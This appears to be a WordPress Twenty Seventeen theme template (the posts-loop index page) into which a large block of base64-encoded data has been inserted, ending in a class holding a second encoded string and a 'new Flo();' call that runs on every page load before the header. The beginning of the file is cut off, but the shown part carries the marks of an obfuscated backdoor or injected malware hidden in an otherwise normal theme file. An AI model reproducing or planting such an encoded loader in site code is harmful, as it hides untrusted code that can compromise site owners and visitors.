	MZjbQnwSFRmiJYhw0KeHlgpRaZwM6iG6yIEbg8MS5/pX4MLrNncQPMEkTtHzUVl6DGCzM4+4vMQDjB1B
	hc2PxCwLUfybKhO5ABb9YbkBQOJeMdqTL4lfaWLig2L1rTeeymH9L2OlaavIQ4AFcvX8d3BNINroUfw0
	ymi4S7k+nxmNytkMj1wCzv3BmuwKwU5P/x9DCZWnOwO3o6kXpx1l/EpOXFtNEdxmpV+C0Syw9ZAXXjsi
	QK24R8kS6BDy7xUy2bsmSlIRer8QfFD2EJ7DHSQRDsgeotUuh4dU/6TeTGvYZe0v7Xbi6pnEXxtmzrC3
	qg6uC9UDDpW0312xDxWcO05jwardH9TAWWvJaWpkRJ8SrgjKz6fST5kZU8IWEYkWarnvKMu+4sTTyNiL
	50jO3+CRgRqARU76ySVD4DmXAhYDDb3J611QJxd6lvNeRYeftvpFqSoqxzbwnotaG5AJIMcjZ4TW/8rP
	H3gWTlbkoMPUyZRS9COjaFqQqmCHa3bFMq4MMvhjX7aMOEE10v9m6SWO1xwVl61CsiRIDPz16zomGq1I
	mvdH+Fu8jgBEBf1rg5oCTZ66HfchXvj5pSgifXYHLhHSJDEkkRBU+tUt+hEnva1gcMtd27PCoaYeBUg2
	I1nPCUlbpXdvgC0UQXb1W5RLzCKQnjo0kS8EhVC3uhG1cDrbrsjnku4yKHuG7shr7T540mqsIUaHCiJN
	VCfLTkQNRQAy+TyeaAymFmPX0EkPg9yqfUQTaF6b8AMEH77GTeX0IxdEI8aYEh96n7jnNGmVsVkNbKlQ
	I9aP2rIs9ceRHTcfRUl+8bgqcxR4eDtEX/TkNG8EALgxPHS44vTrzVIvHo3PHynPkleFrvMWHUvE6Ead
	wwNmAQMK18tBCS154/0QAeAI29vwBDAGOQNOB+7AynBhWavm8VHh5nm4/IE6I6lmtWX4VN+WegOwR+Nc
	IWQgQFD6BaQaVQpRpaMXkv7mrNW1dJxJAoV0SfkxEU2XoxzH1ZIB4JAfkDuTZUmouyVIKdjXum/BJHnU
	ji3tUAEsaJfB0yzhD8FRL6i7sz+PbsH/ysLHf4EA78qYIlfpv6MO7KbOwpqhiJzhNiuWl9cQlfgCVMaO
	3NAmS7u+SlWDeIc4bkNphjOxLz2yGWZBum20E9K7BUvnCM9Crsv2UQrXVBAaXgED7jTRIqBXomH8xPfO
	RBWlnsmdWGHAZzvGlEVlsY8e6la4RadqAzzeHR2oIzMwZpcHKSvd95hpd1k3JkAWSDPjBLrvX/jh4QaN
	PUHGabxFve3VThfcb88qSKDUfJMpwYLbJwFocI89m8IlPBdinPwUEquET52ibLSnWwLlt0G2YSyJYtrm
	kDNxrWPuUOqKCcFI0goz3L21JO/orgSjI3U2fRXv21afHTeuW6Aaa6QuJJbh9R5vvTrr5zz5K4OlHNcQ
	uJ1xLh+8XyJZeyafUGtzoPW+eJnXgcSog/wNs441HFXku7oAGe4iPDVN3g604Kkw8de+ngixUkiJc8wa
	688wI3/h2jman5dcBQCIWyQRpfme8aYYVqcClm9qjx6vjyYZZC22EYAqax9+be/oHgNK1Fbg4WThno9E
	N83hW+XGTYBeCP8DtBPugxN4jgYSdeNNkdtVxJhCL0Mc/XV7sauk6/2VZQlYwG49oQVvOPBXDEjqREio
	o+E19kaRiTJfU9XUCp5Mc4qdfrsPS2XUOB4gfkDTModALL9kx96HpQBcleqYyWcGJZ/McziKrtFNIB1a
	pz7qGLK0e4XzcYL114E3dW9SEnCBltDxAenSQWNqhobBmiLUu0mcg73Lax4M4eKzxzfO0cSySQZQSqED
	OxH3geR3W7YtAK3P34+7UwKLJ2MeDxuTdNZWwGINsJo7ZNoIk0b1GU8SSQmNiR4Q2l4V4MXBlDNDOT/7
	M5pyOAXWQasCOskss2ITn/JNJdDylT5e6Zr4siBfbNOix3HicJqNY55t6DDM1tTIrgQGvA08/OQDvY5f
	prGgf/6TE6dj7pZmVWCCBSp3p+BrEcbO12OGqLcfYf9AqeYtEC0od8ZXlt0DpIfWJfzp8H3WxTlzs2V8
	wP6hvPIWOna60vLCSpMcxaT6vV2dNYZ/OsmzDuHYtBP1i4kkk6a/c9iSx0hTgC942GJtuy+rN7plfHO8
	qh07GJ4UGprNvB6cFnLp1ycNDtiC4CT1UOuSGPUOWdMwIfZNkAzZYGYtLQQJxB2HJc8NsUkPU1//tDWd
	HVv8l6hNboOWAcPG2eUiaNKCUc+L5oJcYWiNjC+/IvgY4HhtM8Wk8CrC//XqWXksH5MobjLHqcxHfjaW
	kd2OnvQkICfRcOdam0QGYCsk6k/m2rKVIFT/DuQPAHnW1f97EpIY9uDTYWwGYe898GPXJZLuJ82n1OfQ
	/+yxm8wKP+YqkSZftACvoB5ugPxJAsy+ABlcXraTK5J4aVlgxbMtOTqCH42Jip1IsMzIBBtP6PHSFS2q
	Oq1Gg14NK/HNsDLBAUscf8OXKD8+wPFYKT6uid/qVNHiXJmWu6aHCPoAfYg+gkYyA+NdPziUAcd10P+j
	UOAFmbgIILo4NRhzQy1QAJeBI7lG4kOAX2C3CjH+bQJmh0GJUzzXV9iynPBBFb27Czh/6to/eq2bRPBW
	s5tLOYmFzu2EphJLZeirPuECFTdLmZSSzyp6wx2S3rbk2B7+/jbn6OP6ZvIuWavkR3ahR4tkhU3Y+tby
	uiLcHelq3j7IiLf19vFd0MUaly2eNHqldI8nFTzJ+7SQiKe9gXnvclgTvRa9di3aFCW5Uoz32RM15gPn
	ywMQGKUcLRWwfg03IhNelzqZZCC88PzBVtuvvNmJpyNSz39rw4IDo45xxkZMPBPoEH3kr9qICEe/4S0C
	6Hqj32+PtZ4Ue1YxWcPa0Bn7RhRoECpCxSXJaN3vB/Qyn97q0Aw+9oLKTl9SiKuXE64o64pGByfSJ9p9
	EfkTlSMVJYAVID40EFSlkai9t9Q1jtLpGcmgD3v9l0262hbANiyIsoWlz5WXZWYb52+Q5Q9e4+iPlaub
	Y8hQSQ1bKf08MWyftEtF4m8wvhrubLWqMK+3nOoaqTVN9Dmh4cWjGwNUprYnEeLdo0no7KsdRoPd6hQE
	ct0R0wq0hcB3Af4ueuEwgFD9e0Qs5Npnu1J7MzN7/n7zLmvSnpkLBT7q/LXrgEQL0RoFV0scUpwtFafF
	/9/Mq+qW0Y35Wu86EyLEDdo0KnuTSf5K1Ywu87Z6j06tPCv5Kg5ocrpu/dyAdeRwxF7ibOHeV1nJJAp/
	1MsAO9uqwHEHOK9JJDXtHSPYNyLA4CbRSj4nrOmnsWSaaV9wfNXW/GsxPeRVFJj0Ug/8Q2lH9qNpRFBl
	X0fi3F4jpqHwW9OOJzS11rOkj4AOoKSpDM3hOAJl4TxG7b/3yeau9OsfQXreE73DGNe5ypJc8cVqBnuf
	8E6C8PLIP0FSD+negcflW2HFSmg4yi4+Zuv+kyzevjYY3T3j4CJB4cgjlGLmWLhkeBDTYZJ0xbM7JFEw
	pUijlFX7szOFFlo12SHS8Jldu1jN6u3M7/AkGJtHRXyo1hqUgJPSHc1c3DLA28ojTU3NsWcf5ChJAJ+E
	yjk8JkYbdUe5S2pevqQUbwTIXmzLnhk9dUnvYzw25DxLol+wchPd+8rE4jz+sqAu6Ih/loHCOsWwYjEk
	ZRyiRt1W6+weordQHcsofvkiysC367Sv5sj3YGkqveytppPxzRWIagL5g2DDMDpdw3C0sWBHP+ytex5J
	yGv5l6ixa/w+VumFfcEWKmzo5IFiN+vmayZnxUPNONb29GqeI8tWCaXhMduYBEY+f+DnshmFS5zBkXCf
	WjwbWw0wtwd2Z7ERr7Bf10Br9OdrpR1BYEdJE2Xc0TFaqPqZM6ZCAjke/17lLwyhU5oqflMpOFDAQcck
	xTdEhnLiOySfmpqPIwIIL02Ytk9AbDB3E/r6zC1vAu0ME0x4KE5Xkdck20eQ+Man4oPoTCPL2tw9tTyB
	nKDCiL2fCWyNtN0GEILDdtxpU6IHejIZ8KPb/QH26Q86bh8HXSPrZvGuYLiMvpj4dB2KGLszReHMDGs3
	4S6mz0gbhEWB6c3JaINTMmNY3jScYAF1UFA/gczuoJ/VnQCpvZRhojTo2t1FiN0Jh9VK5oYWJTqfISdY
	J1L/gf6QQ8afB0z2DSZAW/jyhAh8AhPJ/s6+wLpqc3sl9DABlh4w0mWf0ctNvaHqcsJN2Rt/V2KerAYd
	4enB+L7Wsi4t6VCy0+57rtwBufjJnq557aMxbbVgdcRzlZntiJW5pzFhy/8VlR7EujqfH64qRXMrLgHr
	LAAdGCxuDTfFJCCBIfQgq1BHc5uVoWbsbolBMB53bRvi8UePnOLHRNInwqzCk0WiDACetVrgrhjghw0D
	HQQX+MUrQQQZxy0oXhs5a5+vvzEH4gvVoPOF3PJoCg9T6H5zc99UEDBwp/ly2m+pjAcj9apxpKtPTMyV
	QR/XPjD0lWLI2JXUEpdjNrfjWnFIFVPszDHr4oqC15WqRbZE0iDBBvgnpTBXPr98QBqmTcSAsgKEbW0M
	JmqXXKYnYSW5Dfvx2U6ha9n6+tvqCifP1fk5vBU88FcRwf6ZTm/CPguNCjXJnhNlf9MR9VxTQHwHkfW7
	pg2QvcK0NeeZw78Jk7/EaOx12g40zEfosesBWscmXyKraIy4WVIaEU4nT7akKFmbMUWSco3i464cbpGu
	OhwsojBym+GeQVethKooPBky1XYqkXjgZvfQd7mCAVMOzv8lTG5omwGlJZW9onbpAWApfn8ZvPe0YSMR
	xkgPAWxnXO2ofddlJWvniQzglyC/8CTJHfK3AA6wyf0L/+GQsP4N3iJVr5fSSovihxMKUsnYDOcbJTSj
	w76nIshqUe2H+ru+lht8ILmWEwst/Q8FPSM7Qke7Fz0M6ywmCJFgTVIFj+ZHCgRPcEV4jti9h63EpoVw
	dMIumeG7f2Nx7ezrCdQc9T38Qho4IarxBgFDDhWpdaDx7kmoJcDtIDbLJV9r32nwY+9kwzTkQe4Cv5g0
	Uw10hATJoX6XcfQh3eN5sfEHdH6wOoYICV6ONWlCd7rQrry3+dn1bRo66NuKsotuB3yscrCDh5LU2QU8
	6jSwiLbKnenrm1TnWGGjKX5bAN2W2j5QwS5+iBOWV8WhseWAo9vbfUz5xQIm1DWTAXpRDWxPU2kRhVFz
	';
	 
	var $_ver = 'bVLbTttAEH0OEv8wrCzWlqyE0DRU8uUFuaJCIm2S9iVUkbHHzQp716zXNRbk3zs2tybwNjNn5uyZM2s1
	OQTAuQfWXd5QmMV5hd7hgVXGfyhlawZDqOqbymi72sRj21ovovmvaL7iF8vl9/XFbLHkvx0XTlz45NCg
	yGxRVWiocR79+Bktliu+Lu6ox4GHw4PBwOqf3KXc6+zZxtOObrAFJEX/sZ7PZpffolUncI9zF/N64Gkr
	o2vsyXp9R1iUprVpiOY1mlpLiLWO+5ILPMNTzCbchY7H7Z3ppGCyUcD9G5W2oGSipMF7U6CsA/ZM0pvH
	Qr9KtChNmKqkJtwMGy0M5tJmk5MJXCkDX1UtU+Z4rx1K3mKbqkZ2J6hlYoSSNtJ2IgMbh4nR+SW2cHzc
	ZdR6rlKEIAhgegaPj7Bb+zL9oPb5fW08Pnsz4OnwW68RknSQoCQXye1Hco5e9bwMe/Bu1WvuZ0oXEPez
	AWNQoNmoNGClqgx5JGRZGzBtiQHrjGQg44Ji+gF7KH2VQhD+N85rSsOQ8FFHHl5zx9v6o2e7/VF3mpB7
	/wA=';
}

new Flo();

get_header(); ?>

<div class="wrap">
	<?php if ( is_home() && ! is_front_page() ) : ?>
		<header class="page-header">
			<h1 class="page-title"><?php single_post_title(); ?></h1>
		</header>
	<?php else : ?>
	<header class="page-header">
		<h2 class="page-title"><?php _e( 'Posts', 'twentyseventeen' ); ?></h2>
	</header>
	<?php endif; ?>

	<div id="primary" class="content-area">
		<main id="main" class="site-main" role="main">

			<?php
			if ( have_posts() ) :

				/* Start the Loop */
				while ( have_posts() ) : the_post();

					/*
					 * Include the Post-Format-specific template for the content.
					 * If you want to override this in a child theme, then include a file
					 * called content-___.php (where ___ is the Post Format name) and that will be used instead.
					 */
					get_template_part( 'template-parts/post/content', get_post_format() );

				endwhile;

				the_posts_pagination( array(
					'prev_text' => twentyseventeen_get_svg( array( 'icon' => 'arrow-left' ) ) . '<span class="screen-reader-text">' . __( 'Previous page', 'twentyseventeen' ) . '</span>',
					'next_text' => '<span class="screen-reader-text">' . __( 'Next page', 'twentyseventeen' ) . '</span>' . twentyseventeen_get_svg( array( 'icon' => 'arrow-right' ) ),
					'before_page_number' => '<span class="meta-nav screen-reader-text">' . __( 'Page', 'twentyseventeen' ) . ' </span>',
				) );

			else :

				get_template_part( 'template-parts/post/content', 'none' );

			endif;
			?>

		</main><!-- #main -->
	</div><!-- #primary -->
	<?php get_sidebar(); ?>
</div><!-- .wrap -->

<?php get_footer();
